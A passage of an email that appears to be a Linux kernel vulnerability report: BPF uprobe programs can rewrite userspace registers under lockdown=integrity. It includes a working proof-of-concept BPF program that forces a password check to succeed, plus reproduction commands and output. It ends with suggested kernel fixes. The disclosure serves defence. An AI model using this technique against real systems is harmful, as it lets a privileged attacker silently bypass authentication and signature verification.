The only userspace-visible artefact while the probe is armed is a
4 KiB Anonymous/Private_Dirty page in the target's r-xp VMA
(uprobe's CoW for the int3); this reverts to zero on detach via the
__replace_page(NULL) path in uprobe_write_opcode(), so it is a
presence signal only.

This is strictly more capable than bpf_probe_write_user (which can
corrupt data but not directly set ip), and is reached with the same
privilege, yet only the weaker primitive is lockdown-gated.

Suggested fix
-------------
Gate writable kprobe/uprobe context behind security_locked_down() at
the point the verifier permits the store. Two reasonable shapes:

(a) In kprobe_prog_is_valid_access() (kernel/trace/bpf_trace.c),
    when type =3D=3D BPF_WRITE, call
    security_locked_down(LOCKDOWN_BPF_WRITE_USER) and return false
    if denied. This reuses the existing reason and matches the
    intent ("BPF writing to user state"). One line, adjacent to the
    kprobe_write_ctx flag set.

(b) Introduce a dedicated LOCKDOWN_BPF_WRITE_REGS reason at
    LOCKDOWN_INTEGRITY_MAX scope, for clearer audit messages, and
    check it in the same place.

Either way the check belongs at verify/load time rather than attach
time, so the program is refused outright rather than attaching as a
no-op.

Orthogonally, a CONFIG_BPF_UPROBE_OVERRIDE knob (mirroring
CONFIG_BPF_KPROBE_OVERRIDE for bpf_override_return) would let
distributions opt out independent of lockdown.

thanks,
X.


--_000_DM6PR11MB4722C282C0F20BB23F54A87ADB362DM6PR11MB4722namp_
Content-Type: text/html; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable

<html>
<head>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dus-ascii"=
>
</head>
<body>
<span style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size:=
 12pt; color: rgb(0, 0, 0);">Summary</span>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
-------</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
Kernels that permit BPF_PROG_TYPE_KPROBE programs attached as uprobes to</d=
iv>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
store to their pt_regs context allow a CAP_BPF+CAP_PERFMON (or root)</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
user to redirect control flow (set ip/sp/any GPR) in arbitrary userspace</d=
iv>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
processes. This is not gated by the lockdown LSM: under</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
lockdown=3Dintegrity, bpf_probe_write_user() is correctly refused via</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
LOCKDOWN_BPF_WRITE_USER, but the strictly more powerful direct-ctx-store</d=
iv>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
path is not, because lockdown's BPF hooks are implemented per-helper and</d=
iv>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
this primitive uses no helper.</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
Net effect: on a lockdown=3Dintegrity system, root can hijack execution in<=
/div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
sshd, libpam, signature verifiers, etc., with no ptrace, no text</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
modification on disk, and no helper that lockdown currently inspects.</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
This appears to violate the integrity-mode guarantee in the same way</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
that motivated LOCKDOWN_BPF_WRITE_USER.</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
Affected</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
--------</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
Reproduced on:</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; - torvalds/master at dd6c438c3 (&quot;Merge tag 'vfs-7.1-rc1.fixes'&=
quot;),</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; built and booted as 7.0.0+ (x86_64, lockdown=3Dintegrity) -- =
full PoC</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; succeeds, transcript below.</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; - 6.18.5 (Debian/Kali 6.18.5-1kali1, x86_64).</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
Relevant code in master:</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; kernel/trace/bpf_trace.c: kprobe_prog_is_valid_access()</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; if (type =3D=3D BPF_WRITE)</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp; &nbsp; prog-&gt;aux-&gt;kprobe_write_ctx =3D true;</di=
v>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; return true;</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; -- no offset restriction (ip/sp permitted), no security_locked_down(=
).</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; kernel/events/core.c: perf_event_set_bpf_prog()</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; /* Writing to context allowed only for uprobes. */</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; if (prog-&gt;aux-&gt;kprobe_write_ctx &amp;&amp; !is_uprobe)<=
/div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp; &nbsp; return -EINVAL;</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; -- restricts to uprobe attach, no lockdown check.</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; kernel/trace/bpf_trace.c: bpf_kprobe_multi_link_attach()</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; if (prog-&gt;aux-&gt;kprobe_write_ctx) return -EINVAL;</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; -- kprobe_multi path correctly refuses.</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; kernel/bpf/syscall.c: bpf_tracing_prog_attach()</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; -- freplace smuggling into kprobes was separately found and closed</=
div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;in 611fe4b79af7 (&quot;bpf: Fix abuse of kprobe_write_c=
tx via</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;freplace&quot;, 2026-03-31). The lockdown interaction w=
as not</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;addressed in that series.</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
So the feature is deliberately fenced to uprobes (kernel pt_regs are</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
protected), but nothing in the load or attach path consults</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
security_locked_down(). LOCKDOWN_BPF_WRITE_USER is checked only in</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
bpf_tracing_func_proto() for the bpf_probe_write_user helper.</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
Introduced in 7384893d970e (&quot;bpf: Allow uprobe program to change</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
context registers&quot;, Jiri Olsa, 2025-09-16) and 4363264111e1 (&quot;upr=
obe:</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
Do not emulate/sstep original instruction when ip is changed&quot;), merged=
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
for v6.18 via ae28ed4578e6. So affected range is v6.18 .. current.</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
The feature is consumed in the wild by Cilium Tetragon's</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
`action: Override` / `argRegs` mechanism (see</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
pkg/bpf/detect_linux.go:HasUprobeRegsChange() and</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
pkg/selectors/kernel_regs_amd64.go in the tetragon tree), which is how</div=
>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
I encountered it.</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
Reproduction</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
------------</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
1. Enable lockdown:</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;# echo integrity &gt; /sys/kernel/security/lockdown</di=
v>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;# cat /sys/kernel/security/lockdown</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;none [integrity] confidentiality</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
2. Positive control -- confirm bpf_probe_write_user is refused:</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;# dmesg | tail</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;Lockdown: ...: use of bpf to write user RAM is restrict=
ed;</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp; &nbsp;see man kernel_lockdown.7</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
3. Build and run the attached PoC (victim.c, regwrite.bpf.c,</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp;regwrite.c, Makefile -- standard libbpf skeleton):</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;$ ./victim wrong &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# pr=
ints &quot;denied&quot; once per second</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;# ./regwrite ./victim check_password</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp;Observed: verifier accepts the program; uprobe attaches; victi=
m</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp;output flips from &quot;denied&quot; to &quot;AUTH OK&quot; wi=
th no restart. Detach</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp;(^C) reverts cleanly. No lockdown denial is logged.</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp;Transcript from torvalds/master @ dd6c438c3:</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;$ uname -a &amp;&amp; cat /sys/kernel/security/lockdown=
 &amp;&amp; ./victim wrong</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;Linux ... 7.0.0+ #2 SMP PREEMPT_DYNAMIC Fri Apr 24 05:2=
7:53 EDT 2026 x86_64 GNU/Linux</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;none [integrity] confidentiality</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;denied</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;denied</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;AUTH OK &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;-- regwri=
te attached here</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;AUTH OK</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;AUTH OK</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;denied &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;-- regwri=
te ^C detached here</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;denied</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;# ./regwrite ./victim check_password</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;...</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;libbpf: prog 'hijack': relo #1: &lt;byte_off&gt; [2] st=
ruct pt_regs.ax (0:10 @ offset 80)</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;libbpf: prog 'hijack': relo #2: &lt;byte_off&gt; [2] st=
ruct pt_regs.ip (0:16 @ offset 128)</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;libbpf: prog 'hijack': relo #3: &lt;byte_off&gt; [2] st=
ruct pt_regs.sp (0:19 @ offset 152)</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;...</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;libbpf: elf: symbol address match for 'check_password' =
in './victim': 0x1159</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp;[+] attached to ./victim:check_password - hook is live =
in ALL pids.</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
The relevant BPF program body is three context stores and nothing else:</di=
v>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; SEC(&quot;uprobe&quot;)</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; int BPF_UPROBE(hijack)</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; {</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp; &nbsp; struct pt_regs *r =3D (struct pt_regs *)ctx;</d=
iv>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp; &nbsp; __u64 rsp =3D PT_REGS_SP(r), ra =3D 0;</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp; &nbsp; bpf_probe_read_user(&amp;ra, sizeof(ra), (void =
*)rsp);</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp; &nbsp; r-&gt;ax =3D 1; &nbsp; &nbsp; &nbsp; &nbsp; &nb=
sp;/* forced return value &nbsp; &nbsp; &nbsp;*/</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp; &nbsp; r-&gt;ip =3D ra; &nbsp; &nbsp; &nbsp; &nbsp; /*=
 jump to caller &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; */</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp; &nbsp; r-&gt;sp =3D rsp + 8; &nbsp; &nbsp;/* pop the r=
eturn address &nbsp; */</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; &nbsp; &nbsp; return 0;</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; }</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
Impact</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
------</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
Under lockdown=3Dintegrity, root retains the ability to:</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; - force arbitrary return values from any userspace function</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; (auth checks, signature verification, policy decisions);</div=
>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; - redirect rip to arbitrary mapped text (ROP/JOP entry);</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; - do so with no ptrace, no PTRACE_POKETEXT, no /proc/pid/mem,</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; no bpf_probe_write_user, no persistent .text modification.</d=
iv>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
The only userspace-visible artefact while the probe is armed is a</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
4 KiB Anonymous/Private_Dirty page in the target's r-xp VMA</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
(uprobe's CoW for the int3); this reverts to zero on detach via the</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
__replace_page(NULL) path in uprobe_write_opcode(), so it is a</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
presence signal only.</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
This is strictly more capable than bpf_probe_write_user (which can</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
corrupt data but not directly set ip), and is reached with the same</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
privilege, yet only the weaker primitive is lockdown-gated.</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
Suggested fix</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
-------------</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
Gate writable kprobe/uprobe context behind security_locked_down() at</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
the point the verifier permits the store. Two reasonable shapes:</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
(a) In kprobe_prog_is_valid_access() (kernel/trace/bpf_trace.c),</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; when type =3D=3D BPF_WRITE, call</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; security_locked_down(LOCKDOWN_BPF_WRITE_USER) and return fals=
e</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; if denied. This reuses the existing reason and matches the</d=
iv>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; intent (&quot;BPF writing to user state&quot;). One line, adj=
acent to the</div>
<div style=3D"font-family: Aptos, Arial, Helvetica, sans-serif; font-size: =
12pt; color: rgb(0, 0, 0);">
&nbsp; &nbsp; kprobe_write_ctx flag set.</div>
<div style=3D"direction: ltr; font-family: Aptos, Arial, Helvetica, sans-se=
rif; font-size: 12pt; color: rgb(0, 0, 0);">
<br>
</div>
